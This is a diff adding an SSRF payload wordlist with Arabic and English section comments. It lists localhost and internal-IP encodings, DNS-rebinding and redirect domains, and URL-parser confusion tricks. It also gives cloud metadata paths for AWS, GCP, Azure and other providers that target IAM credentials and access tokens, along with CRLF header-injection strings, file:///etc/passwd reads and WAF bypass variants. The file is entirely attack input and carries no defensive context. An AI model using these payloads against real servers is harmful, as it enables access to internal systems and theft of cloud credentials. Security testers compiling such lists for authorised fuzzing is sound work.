@@ -1,0 +1,277 @@
+0
+2130706433
+http://2130706433/            # (Decimal IP لـ 127.0.0.1)
+http://[::]:80/               # (IPv6 Bypass)
+http://127.1/                 # (Short IP)
+http://0.0.0.0:80/            # (Alternative Localhost)
+http://local.gd/              # (Domain يوجه لـ 127.0.0.1)
+http://127.0.0.1.nip.io/      # (Wildcard DNS)
+# IP Obfuscation (تحويلات الآي بي)
+http://2130706433/
+http://0177.0.0.1/
+http://0x7f.0.0.1/
+http://127.0.0.1/
+http://127.1/
+http://0/
+http://[::1]/
+http://[::]/
+http://0000::1/
+
+# DNS Redirect & Wildcards (تلاعب بالنطاقات)
+http://local.gd
+http://spoofed.127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+http://bit.ly/2S6X76B
+http://tinyurl.com/local-test-bypass
+# Mixed Encoded (ترميزات مختلطة)
+http://127.0.0.1:80@google.com
+http://google.com@127.0.0.1
+http://①②⑦.⓪.⓪.①
+http://{domain}@127.0.0.1
+http://127.0.0.1#{domain}
+http://{domain}.127.0.0.1
+http://127.0.0.1/{domain}
+http://127.0.0.1/?d={domain}
+https://{domain}@127.0.0.1
+https://127.0.0.1#{domain}
+https://{domain}.127.0.0.1
+https://127.0.0.1/{domain}
+https://127.0.0.1/?d={domain}
+http://{domain}@localhost
+http://localhost#{domain}
+http://{domain}.localhost
+http://localhost/{domain}
+http://localhost/?d={domain}
+http://127.0.0.1%00{domain}
+http://127.0.0.1?{domain}
+http://127.0.0.1///{domain}
+https://127.0.0.1%00{domain}
+https://127.0.0.1?{domain}
+https://127.0.0.1///{domain}
+# Cloud Metadata Payloads
+# AWS
+169.254.169.254/latest/meta-data/
+169.254.169.254/latest/user-data/
+169.254.169.254/latest/meta-data/iam/security-credentials/
+169.254.169.254/latest/meta-data/iam/security-credentials/ecs-task-role
+169.254.169.254/latest/dynamic/instance-identity/document
+169.254.169.254/latest/api/token
+169.254.170.2/v2/credentials
+# Google Cloud
+metadata.google.internal/computeMetadata/v1/
+metadata.google.internal/computeMetadata/v1beta1/
+169.254.169.254/computeMetadata/v1/
+metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+# Azure
+169.254.169.254/metadata/instance?api-version=2021-02-01
+169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+169.254.169.254/metadata/scheduledevents?api-version=2020-07-01
+# Digital Ocean
+169.254.169.254/metadata/v1.json
+169.254.169.254/metadata/v1/id
+169.254.169.254/metadata/v1/hostname
+# Alibaba Cloud
+100.100.100.200/latest/meta-data/
+100.100.100.200/latest/meta-data/instance-id
+100.100.100.200/latest/user-data
+# Oracle Cloud
+192.0.0.192/opc/v1/instance/
+192.0.0.192/opc/v1/vnics/
+192.0.0.192/opc/v2/instance/
+# Kubernetes
+kubernetes.default.svc
+kubernetes.default.svc.cluster.local
+# Scaleway
+169.254.42.42/conf
+# Equinix Metal (Packet)
+metadata.packet.net/userdata
+# Docker Internal
+host.docker.internal
+docker.for.mac.localhost
+# Payloads for CRLF-based SSRF. {host} will be replaced by the target payload.
+# These are injected into headers.
+ignored.com%0d%0aHost:%20{host}
+ignored.com%0d%0aX-Forwarded-Host:%20{host}
+ignored.com%0d%0aX-Real-IP:%20{host}
+ignored.com%0d%0aGET%20/index.html%20HTTP/1.1%0d%0aHost:%20{host}%0d%0aConnection:%20close%0d%0a%0d%0a
+ignored.com%0d%0aGET%20http://{host}/%20HTTP/1.1%0d%0aHeader:%20value
+ignored.com%0aHost:%20{host}
+ignored.com%0dHost:%20{host}
+ignored.com%20%0d%0aHost:%20{host}
+# Base payloads for encoding attacks
+127.0.0.1
+localhost
+google.com
+bing.com
+127.0.0.1:22
+127.0.0.1:8080
+file:///etc/passwd
+file:///c:/windows/win.ini
+http://127.0.0.1
+https://127.0.0.1
+# Local IP Payloads
+# Standard localhost variations
+[::1]
+::1
+127.0.0.1:80
+127.0.0.1:443
+localhost:80
+localhost:443
+0.0.0.0
+127.1
+127.0.1
+127.0.0.0
+127.127.127.127
+127.0.0.1.nip.io
+loopback
+# IP encoding variations
+0x7f000001
+0177.0.0.1
+0177.0000.0000.0001
+# Dotted decimal variations
+127.0.0.1.
+127.0.0.1..
+.localhost
+..localhost
+.127.0.0.1
+# Mixed encoding
+0x7f.0.0.1
+127.0x0.0x0.0x1
+# IPv6 variations
+[0:0:0:0:0:ffff:127.0.0.1]
+[::ffff:127.0.0.1]
+[::ffff:7f00:1]
+0000::1
+0:
+0:0:0:0:0:0:0:1
+# Internal network ranges
+10.0.0.1
+10.0.0.2
+172.16.0.1
+172.16.0.2
+192.168.0.1
+192.168.1.1
+192.168.1.254
+192.168.1.100
+10.0.0.0/8
+172.16.0.0/12
+192.168.0.0/16
+169.254.169.254
+# Special hostnames
+internal
+intranet
+local
+private
+localhost.localdomain
+gateway
+router
+api.internal
+db.internal
+# WAF Bypass Payloads
+127.0.0.1#
+127.0.0.1%23
+127.0.0.1%2523
+127.0.0.1:80#
+localhost#
+127.0.0.1:80?
+localhost?
+127.0.0.1%3F
+http://127.0.0.1/%2e%2e
+http://127.0.0.1/%2e/
+http://127.0.0.1/..;/
+127.0.0.1%0d%0a
+127.0.0.1%0a
+127.0.0.1%09
+127.0.0.1%20
+127.0.0.1:80\\@google.com/
+whitelisted.com@localhost
+http://127.0.0.1:80/
+http://[::]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[::ffff:127.0.0.1]
+http://[::ffff:7f00:1]
+http://localhost:80
+http://localHOST
+hTtP://127.0.0.1
+127.0.0.1.xip.io
+spoofed.burpcollaborator.net
+127.0.0.1.burpcollaborator.net
+127.0.0.1.interact.sh
+127.0.0.1.sslip.io
+localtest.me
+http://127.0.0.1%00.example.com
+http://localhost:22
+https://localhost:443
+http://127.0.0.1:80
+http://127.0.0.1:22
+https://127.0.0.1:443
+http://0.0.0.0:80
+http://0.0.0.0:22
+https://0.0.0.0:443
+http://[0000::1]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://127.1
+http://127.0.1
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/ = http://169.254.169.254
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+http://0x7f000001 = http://127.0.0.1
+http://0xc0a80101 = http://192.168.1.1
+http://0xa9fea9fe = http://169.254.169.254
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+#= example.com
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 
+http://ip6-localhost = ::1
+http://ip6-loopback = ::1
+https://307.r3dir.me/--to/?url=http://localhost
+https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+Address: 1.2.3.4
+Address: 169.254.169.254
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+http:127.0.0.1/
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+file://\/\/etc/passwd
+127.000.000.1
+127.0.0.2
+0x7f.0x0.0x0.0x1
+0177.0.0.01
+01111111000000000000000000000001
+01111111.00000000.00000000.00000001
+%6c%6f%63%61%6c%68%6f%73%74
+0177.0.0.0x1
+169.254.169.254/latest/meta-data/hostname
+fuf.me
+ulh.us
+127-0-0-1.org.uk
+ratchetlocal.com
+smackaho.st
+42foo.com
+vcap.me
+beweb.com
+yoogle.com
+ortkut.com
+feacebook.com
+lvh.me
+1.1.1.1 &@2.2.2.2# @3.3.3.3
+urllib: 3.3.3.3
+[::]:80
+[::]:443
+0000::1:80
